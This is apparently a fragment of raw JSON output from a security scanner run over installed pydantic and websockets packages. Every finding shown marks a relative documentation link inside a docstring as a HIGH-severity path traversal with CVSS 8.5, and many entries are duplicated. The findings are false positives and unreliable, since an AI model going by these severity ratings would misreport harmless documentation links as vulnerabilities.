            "line": 2488,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[`WithJsonSchema` Annotation](../concepts/json_schema.md#withjsonschema-annotation)",
            "context": "class WithJsonSchema:\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [`WithJsonSchema` Annotation](../concepts/json_schema.md#withjsonschema-annotation)\n\n    Add this as an annotation on a field to override the (base) JSON schema that would be generated for that field.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/json_schema.py",
            "line": 2631,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[`SkipJsonSchema` Annotation](../concepts/json_schema.md#skipjsonschema-annotation)",
            "context": "    class SkipJsonSchema:\n        \"\"\"!!! abstract \"Usage Documentation\"\n            [`SkipJsonSchema` Annotation](../concepts/json_schema.md#skipjsonschema-annotation)\n\n        Add this as an annotation on a field to skip generating a JSON schema for that field.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/json_schema.py",
            "line": 2631,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[`SkipJsonSchema` Annotation](../concepts/json_schema.md#skipjsonschema-annotation)",
            "context": "    class SkipJsonSchema:\n        \"\"\"!!! abstract \"Usage Documentation\"\n            [`SkipJsonSchema` Annotation](../concepts/json_schema.md#skipjsonschema-annotation)\n\n        Add this as an annotation on a field to skip generating a JSON schema for that field.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/main.py",
            "line": 123,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[Models](../concepts/models.md)",
            "context": "class BaseModel(metaclass=_model_construction.ModelMetaclass):\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [Models](../concepts/models.md)\n\n    A base class for creating Pydantic models.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/main.py",
            "line": 123,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[Models](../concepts/models.md)",
            "context": "class BaseModel(metaclass=_model_construction.ModelMetaclass):\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [Models](../concepts/models.md)\n\n    A base class for creating Pydantic models.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/main.py",
            "line": 389,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[`model_copy`](../concepts/serialization.md#model_copy)",
            "context": "    def model_copy(self, *, update: Mapping[str, Any] | None = None, deep: bool = False) -> Self:\n        \"\"\"!!! abstract \"Usage Documentation\"\n            [`model_copy`](../concepts/serialization.md#model_copy)\n\n        Returns a copy of the model.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/main.py",
            "line": 389,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[`model_copy`](../concepts/serialization.md#model_copy)",
            "context": "    def model_copy(self, *, update: Mapping[str, Any] | None = None, deep: bool = False) -> Self:\n        \"\"\"!!! abstract \"Usage Documentation\"\n            [`model_copy`](../concepts/serialization.md#model_copy)\n\n        Returns a copy of the model.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/main.py",
            "line": 438,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[`model_dump`](../concepts/serialization.md#modelmodel_dump)",
            "context": "    ) -> dict[str, Any]:\n        \"\"\"!!! abstract \"Usage Documentation\"\n            [`model_dump`](../concepts/serialization.md#modelmodel_dump)\n\n        Generate a dictionary representation of the model, optionally specifying which fields to include or exclude.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/main.py",
            "line": 438,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[`model_dump`](../concepts/serialization.md#modelmodel_dump)",
            "context": "    ) -> dict[str, Any]:\n        \"\"\"!!! abstract \"Usage Documentation\"\n            [`model_dump`](../concepts/serialization.md#modelmodel_dump)\n\n        Generate a dictionary representation of the model, optionally specifying which fields to include or exclude.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/main.py",
            "line": 496,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[`model_dump_json`](../concepts/serialization.md#modelmodel_dump_json)",
            "context": "    ) -> str:\n        \"\"\"!!! abstract \"Usage Documentation\"\n            [`model_dump_json`](../concepts/serialization.md#modelmodel_dump_json)\n\n        Generates a JSON representation of the model using Pydantic's `to_json` method.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/main.py",
            "line": 496,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[`model_dump_json`](../concepts/serialization.md#modelmodel_dump_json)",
            "context": "    ) -> str:\n        \"\"\"!!! abstract \"Usage Documentation\"\n            [`model_dump_json`](../concepts/serialization.md#modelmodel_dump_json)\n\n        Generates a JSON representation of the model using Pydantic's `to_json` method.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/main.py",
            "line": 720,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[JSON Parsing](../concepts/json.md#json-parsing)",
            "context": "    ) -> Self:\n        \"\"\"!!! abstract \"Usage Documentation\"\n            [JSON Parsing](../concepts/json.md#json-parsing)\n\n        Validate the given JSON data against the Pydantic model.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/main.py",
            "line": 720,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[JSON Parsing](../concepts/json.md#json-parsing)",
            "context": "    ) -> Self:\n        \"\"\"!!! abstract \"Usage Documentation\"\n            [JSON Parsing](../concepts/json.md#json-parsing)\n\n        Validate the given JSON data against the Pydantic model.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/main.py",
            "line": 1693,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[Dynamic Model Creation](../concepts/models.md#dynamic-model-creation)",
            "context": ") -> type[ModelT]:\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [Dynamic Model Creation](../concepts/models.md#dynamic-model-creation)\n\n    Dynamically creates and returns a new Pydantic model, in other words, `create_model` dynamically creates a",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/main.py",
            "line": 1693,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[Dynamic Model Creation](../concepts/models.md#dynamic-model-creation)",
            "context": ") -> type[ModelT]:\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [Dynamic Model Creation](../concepts/models.md#dynamic-model-creation)\n\n    Dynamically creates and returns a new Pydantic model, in other words, `create_model` dynamically creates a",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/dataclasses.py",
            "line": 113,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[`dataclasses`](../concepts/dataclasses.md)",
            "context": ") -> Callable[[type[_T]], type[PydanticDataclass]] | type[PydanticDataclass]:\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [`dataclasses`](../concepts/dataclasses.md)\n\n    A decorator used to create a Pydantic-enhanced dataclass, similar to the standard Python `dataclass`,",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/dataclasses.py",
            "line": 113,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[`dataclasses`](../concepts/dataclasses.md)",
            "context": ") -> Callable[[type[_T]], type[PydanticDataclass]] | type[PydanticDataclass]:\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [`dataclasses`](../concepts/dataclasses.md)\n\n    A decorator used to create a Pydantic-enhanced dataclass, similar to the standard Python `dataclass`,",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/types.py",
            "line": 119,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[Strict Mode with `Annotated` `Strict`](../concepts/strict_mode.md#strict-mode-with-annotated-strict)",
            "context": "class Strict(_fields.PydanticMetadata, BaseMetadata):\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [Strict Mode with `Annotated` `Strict`](../concepts/strict_mode.md#strict-mode-with-annotated-strict)\n\n    A field metadata class to indicate that a field should be validated in strict mode.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/types.py",
            "line": 119,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[Strict Mode with `Annotated` `Strict`](../concepts/strict_mode.md#strict-mode-with-annotated-strict)",
            "context": "class Strict(_fields.PydanticMetadata, BaseMetadata):\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [Strict Mode with `Annotated` `Strict`](../concepts/strict_mode.md#strict-mode-with-annotated-strict)\n\n    A field metadata class to indicate that a field should be validated in strict mode.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/types.py",
            "line": 696,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[`StringConstraints`](../concepts/fields.md#string-constraints)",
            "context": "class StringConstraints(annotated_types.GroupedMetadata):\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [`StringConstraints`](../concepts/fields.md#string-constraints)\n\n    A field metadata class to apply constraints to `str` types.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/types.py",
            "line": 696,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[`StringConstraints`](../concepts/fields.md#string-constraints)",
            "context": "class StringConstraints(annotated_types.GroupedMetadata):\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [`StringConstraints`](../concepts/fields.md#string-constraints)\n\n    A field metadata class to apply constraints to `str` types.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/types.py",
            "line": 2850,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[Using `GetPydanticSchema` to Reduce Boilerplate](../concepts/types.md#using-getpydanticschema-to-reduce-boilerplate)",
            "context": "class GetPydanticSchema:\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [Using `GetPydanticSchema` to Reduce Boilerplate](../concepts/types.md#using-getpydanticschema-to-reduce-boilerplate)\n\n    A convenience class for creating an annotation that provides pydantic custom type hooks.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/types.py",
            "line": 2850,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[Using `GetPydanticSchema` to Reduce Boilerplate](../concepts/types.md#using-getpydanticschema-to-reduce-boilerplate)",
            "context": "class GetPydanticSchema:\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [Using `GetPydanticSchema` to Reduce Boilerplate](../concepts/types.md#using-getpydanticschema-to-reduce-boilerplate)\n\n    A convenience class for creating an annotation that provides pydantic custom type hooks.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/types.py",
            "line": 2963,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[`callable-discriminator-no-tag`](../errors/usage_errors.md#callable-discriminator-no-tag).",
            "context": "        You must specify a `Tag` for every case in a `Tag` that is associated with a\n        callable `Discriminator`. Failing to do so will result in a `PydanticUserError` with code\n        [`callable-discriminator-no-tag`](../errors/usage_errors.md#callable-discriminator-no-tag).\n\n    See the [Discriminated Unions] concepts docs for more details on how to use `Tag`s.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/types.py",
            "line": 2963,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[`callable-discriminator-no-tag`](../errors/usage_errors.md#callable-discriminator-no-tag).",
            "context": "        You must specify a `Tag` for every case in a `Tag` that is associated with a\n        callable `Discriminator`. Failing to do so will result in a `PydanticUserError` with code\n        [`callable-discriminator-no-tag`](../errors/usage_errors.md#callable-discriminator-no-tag).\n\n    See the [Discriminated Unions] concepts docs for more details on how to use `Tag`s.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/types.py",
            "line": 2967,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[Discriminated Unions]: ../concepts/unions.md#discriminated-unions",
            "context": "    See the [Discriminated Unions] concepts docs for more details on how to use `Tag`s.\n\n    [Discriminated Unions]: ../concepts/unions.md#discriminated-unions\n    \"\"\"\n",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/types.py",
            "line": 2967,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[Discriminated Unions]: ../concepts/unions.md#discriminated-unions",
            "context": "    See the [Discriminated Unions] concepts docs for more details on how to use `Tag`s.\n\n    [Discriminated Unions]: ../concepts/unions.md#discriminated-unions\n    \"\"\"\n",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/types.py",
            "line": 2982,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[Discriminated Unions with `Callable` `Discriminator`](../concepts/unions.md#discriminated-unions-with-callable-discriminator)",
            "context": "class Discriminator:\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [Discriminated Unions with `Callable` `Discriminator`](../concepts/unions.md#discriminated-unions-with-callable-discriminator)\n\n    Provides a way to use a custom callable as the way to extract the value of a union discriminator.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/types.py",
            "line": 2982,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[Discriminated Unions with `Callable` `Discriminator`](../concepts/unions.md#discriminated-unions-with-callable-discriminator)",
            "context": "class Discriminator:\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [Discriminated Unions with `Callable` `Discriminator`](../concepts/unions.md#discriminated-unions-with-callable-discriminator)\n\n    Provides a way to use a custom callable as the way to extract the value of a union discriminator.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/types.py",
            "line": 3049,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[Discriminated Unions]: ../concepts/unions.md#discriminated-unions",
            "context": "    See the [Discriminated Unions] concepts docs for more details on how to use `Discriminator`s.\n\n    [Discriminated Unions]: ../concepts/unions.md#discriminated-unions\n    \"\"\"\n",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/types.py",
            "line": 3049,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[Discriminated Unions]: ../concepts/unions.md#discriminated-unions",
            "context": "    See the [Discriminated Unions] concepts docs for more details on how to use `Discriminator`s.\n\n    [Discriminated Unions]: ../concepts/unions.md#discriminated-unions\n    \"\"\"\n",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/types.py",
            "line": 3059,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"\"\"Type to use in [custom errors](../errors/errors.md) replacing the standard discriminated union",
            "context": "    \"\"\"\n    custom_error_type: str | None = None\n    \"\"\"Type to use in [custom errors](../errors/errors.md) replacing the standard discriminated union\n    validation errors.\n    \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/types.py",
            "line": 3059,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"\"\"Type to use in [custom errors](../errors/errors.md) replacing the standard discriminated union",
            "context": "    \"\"\"\n    custom_error_type: str | None = None\n    \"\"\"Type to use in [custom errors](../errors/errors.md) replacing the standard discriminated union\n    validation errors.\n    \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/config.py",
            "line": 465,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See [Strict Mode](../concepts/strict_mode.md) for more details.",
            "context": "    ```\n\n    See [Strict Mode](../concepts/strict_mode.md) for more details.\n\n    See the [Conversion Table](../concepts/conversion_table.md) for more details on how Pydantic converts data in both",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/config.py",
            "line": 465,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See [Strict Mode](../concepts/strict_mode.md) for more details.",
            "context": "    ```\n\n    See [Strict Mode](../concepts/strict_mode.md) for more details.\n\n    See the [Conversion Table](../concepts/conversion_table.md) for more details on how Pydantic converts data in both",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/config.py",
            "line": 467,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See the [Conversion Table](../concepts/conversion_table.md) for more details on how Pydantic converts data in both",
            "context": "    See [Strict Mode](../concepts/strict_mode.md) for more details.\n\n    See the [Conversion Table](../concepts/conversion_table.md) for more details on how Pydantic converts data in both\n    strict and lax modes.\n    \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/config.py",
            "line": 467,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See the [Conversion Table](../concepts/conversion_table.md) for more details on how Pydantic converts data in both",
            "context": "    See [Strict Mode](../concepts/strict_mode.md) for more details.\n\n    See the [Conversion Table](../concepts/conversion_table.md) for more details on how Pydantic converts data in both\n    strict and lax modes.\n    \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/config.py",
            "line": 1068,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See [usage errors](../errors/usage_errors.md#validate-by-alias-and-name-false) for an example.",
            "context": "        This would make it impossible to populate an attribute.\n\n        See [usage errors](../errors/usage_errors.md#validate-by-alias-and-name-false) for an example.\n\n        If you set `validate_by_alias` to `False`, under the hood, Pydantic dynamically sets",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/config.py",
            "line": 1068,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See [usage errors](../errors/usage_errors.md#validate-by-alias-and-name-false) for an example.",
            "context": "        This would make it impossible to populate an attribute.\n\n        See [usage errors](../errors/usage_errors.md#validate-by-alias-and-name-false) for an example.\n\n        If you set `validate_by_alias` to `False`, under the hood, Pydantic dynamically sets",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/config.py",
            "line": 1111,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See [usage errors](../errors/usage_errors.md#validate-by-alias-and-name-false) for an example.",
            "context": "        This would make it impossible to populate an attribute.\n\n        See [usage errors](../errors/usage_errors.md#validate-by-alias-and-name-false) for an example.\n    \"\"\"\n",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/config.py",
            "line": 1111,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See [usage errors](../errors/usage_errors.md#validate-by-alias-and-name-false) for an example.",
            "context": "        This would make it impossible to populate an attribute.\n\n        See [usage errors](../errors/usage_errors.md#validate-by-alias-and-name-false) for an example.\n    \"\"\"\n",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/config.py",
            "line": 1159,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[Configuration with other types](../concepts/config.md#configuration-on-other-supported-types)",
            "context": "def with_config(config: ConfigDict | None = None, /, **kwargs: Any) -> Callable[[_TypeT], _TypeT]:\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [Configuration with other types](../concepts/config.md#configuration-on-other-supported-types)\n\n    A convenience decorator to set a [Pydantic configuration](config.md) on a `TypedDict` or a `dataclass` from the standard library.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/config.py",
            "line": 1159,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[Configuration with other types](../concepts/config.md#configuration-on-other-supported-types)",
            "context": "def with_config(config: ConfigDict | None = None, /, **kwargs: Any) -> Callable[[_TypeT], _TypeT]:\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [Configuration with other types](../concepts/config.md#configuration-on-other-supported-types)\n\n    A convenience decorator to set a [Pydantic configuration](config.md) on a `TypedDict` or a `dataclass` from the standard library.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/type_adapter.py",
            "line": 71,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[`TypeAdapter`](../concepts/type_adapter.md)",
            "context": "class TypeAdapter(Generic[T]):\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [`TypeAdapter`](../concepts/type_adapter.md)\n\n    Type adapters provide a flexible way to perform validation and serialization based on a Python type.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/type_adapter.py",
            "line": 71,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[`TypeAdapter`](../concepts/type_adapter.md)",
            "context": "class TypeAdapter(Generic[T]):\n    \"\"\"!!! abstract \"Usage Documentation\"\n        [`TypeAdapter`](../concepts/type_adapter.md)\n\n    Type adapters provide a flexible way to perform validation and serialization based on a Python type.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/type_adapter.py",
            "line": 88,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[`type-adapter-config-unused`](../errors/usage_errors.md#type-adapter-config-unused) error will",
            "context": "                You cannot provide a configuration when instantiating a `TypeAdapter` if the type you're using\n                has its own config that cannot be overridden (ex: `BaseModel`, `TypedDict`, and `dataclass`). A\n                [`type-adapter-config-unused`](../errors/usage_errors.md#type-adapter-config-unused) error will\n                be raised in this case.\n        _parent_depth: Depth at which to search for the [parent frame][frame-objects]. This frame is used when",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/type_adapter.py",
            "line": 88,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[`type-adapter-config-unused`](../errors/usage_errors.md#type-adapter-config-unused) error will",
            "context": "                You cannot provide a configuration when instantiating a `TypeAdapter` if the type you're using\n                has its own config that cannot be overridden (ex: `BaseModel`, `TypedDict`, and `dataclass`). A\n                [`type-adapter-config-unused`](../errors/usage_errors.md#type-adapter-config-unused) error will\n                be raised in this case.\n        _parent_depth: Depth at which to search for the [parent frame][frame-objects]. This frame is used when",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/type_adapter.py",
            "line": 401,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[partial validation](../concepts/experimental.md#partial-validation), e.g. to process streams.",
            "context": "            context: Additional context to pass to the validator.\n            experimental_allow_partial: **Experimental** whether to enable\n                [partial validation](../concepts/experimental.md#partial-validation), e.g. to process streams.\n                * False / 'off': Default behavior, no partial validation.\n                * True / 'on': Enable partial validation.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/type_adapter.py",
            "line": 401,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[partial validation](../concepts/experimental.md#partial-validation), e.g. to process streams.",
            "context": "            context: Additional context to pass to the validator.\n            experimental_allow_partial: **Experimental** whether to enable\n                [partial validation](../concepts/experimental.md#partial-validation), e.g. to process streams.\n                * False / 'off': Default behavior, no partial validation.\n                * True / 'on': Enable partial validation.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/type_adapter.py",
            "line": 443,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[JSON Parsing](../concepts/json.md#json-parsing)",
            "context": "    ) -> T:\n        \"\"\"!!! abstract \"Usage Documentation\"\n            [JSON Parsing](../concepts/json.md#json-parsing)\n\n        Validate a JSON string or bytes against the model.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/type_adapter.py",
            "line": 443,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[JSON Parsing](../concepts/json.md#json-parsing)",
            "context": "    ) -> T:\n        \"\"\"!!! abstract \"Usage Documentation\"\n            [JSON Parsing](../concepts/json.md#json-parsing)\n\n        Validate a JSON string or bytes against the model.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/type_adapter.py",
            "line": 452,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[partial validation](../concepts/experimental.md#partial-validation), e.g. to process streams.",
            "context": "            context: Additional context to use during validation.\n            experimental_allow_partial: **Experimental** whether to enable\n                [partial validation](../concepts/experimental.md#partial-validation), e.g. to process streams.\n                * False / 'off': Default behavior, no partial validation.\n                * True / 'on': Enable partial validation.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/type_adapter.py",
            "line": 452,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[partial validation](../concepts/experimental.md#partial-validation), e.g. to process streams.",
            "context": "            context: Additional context to use during validation.\n            experimental_allow_partial: **Experimental** whether to enable\n                [partial validation](../concepts/experimental.md#partial-validation), e.g. to process streams.\n                * False / 'off': Default behavior, no partial validation.\n                * True / 'on': Enable partial validation.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/type_adapter.py",
            "line": 495,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[partial validation](../concepts/experimental.md#partial-validation), e.g. to process streams.",
            "context": "            context: Additional context to use during validation.\n            experimental_allow_partial: **Experimental** whether to enable\n                [partial validation](../concepts/experimental.md#partial-validation), e.g. to process streams.\n                * False / 'off': Default behavior, no partial validation.\n                * True / 'on': Enable partial validation.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/type_adapter.py",
            "line": 495,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[partial validation](../concepts/experimental.md#partial-validation), e.g. to process streams.",
            "context": "            context: Additional context to use during validation.\n            experimental_allow_partial: **Experimental** whether to enable\n                [partial validation](../concepts/experimental.md#partial-validation), e.g. to process streams.\n                * False / 'off': Default behavior, no partial validation.\n                * True / 'on': Enable partial validation.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/type_adapter.py",
            "line": 607,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[JSON Serialization](../concepts/json.md#json-serialization)",
            "context": "    ) -> bytes:\n        \"\"\"!!! abstract \"Usage Documentation\"\n            [JSON Serialization](../concepts/json.md#json-serialization)\n\n        Serialize an instance of the adapted type to JSON.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/type_adapter.py",
            "line": 607,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[JSON Serialization](../concepts/json.md#json-serialization)",
            "context": "    ) -> bytes:\n        \"\"\"!!! abstract \"Usage Documentation\"\n            [JSON Serialization](../concepts/json.md#json-serialization)\n\n        Serialize an instance of the adapted type to JSON.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/server.py",
            "line": 72,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "see the :doc:`logging guide <../../topics/logging>` for details.",
            "context": "        logger: Logger for this connection;\n            defaults to ``logging.getLogger(\"websockets.server\")``;\n            see the :doc:`logging guide <../../topics/logging>` for details.\n\n    \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/server.py",
            "line": 72,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "see the :doc:`logging guide <../../topics/logging>` for details.",
            "context": "        logger: Logger for this connection;\n            defaults to ``logging.getLogger(\"websockets.server\")``;\n            see the :doc:`logging guide <../../topics/logging>` for details.\n\n    \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/server.py",
            "line": 72,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "see the :doc:`logging guide <../../topics/logging>` for details.",
            "context": "        logger: Logger for this connection;\n            defaults to ``logging.getLogger(\"websockets.server\")``;\n            see the :doc:`logging guide <../../topics/logging>` for details.\n\n    \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/server.py",
            "line": 72,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "see the :doc:`logging guide <../../topics/logging>` for details.",
